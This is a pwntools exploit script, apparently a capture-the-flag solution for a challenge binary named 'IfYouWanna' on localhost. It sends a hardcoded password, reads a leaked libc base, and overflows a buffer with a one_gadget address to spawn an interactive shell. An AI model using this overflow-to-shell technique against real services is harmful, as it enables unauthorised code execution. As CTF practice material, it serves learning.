#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./IfYouWanna"

rhp1 = {'host':"localhost",'port':20002}
rhp2 = {'host':"localhost",'port':12400}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

onegadgets = [0x4f2c5,0x4f322,0x10a38c]

def exploit(conn):
  conn.recvuntil("password > ")
  conn.sendline("mora+cookie+nan+t4shi+swa11ow=ACE")
  conn.recvuntil(": ")
  libc_base = int(conn.recvline()[:-1],16)
  print("[+]libc_base: "+hex(libc_base))
  conn.recvuntil("> ")

  inp = "y"
  inp += "A"*(0xa8-len(inp))
  inp += p64(onegadgets[1]+libc_base)
  conn.sendline(inp)


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

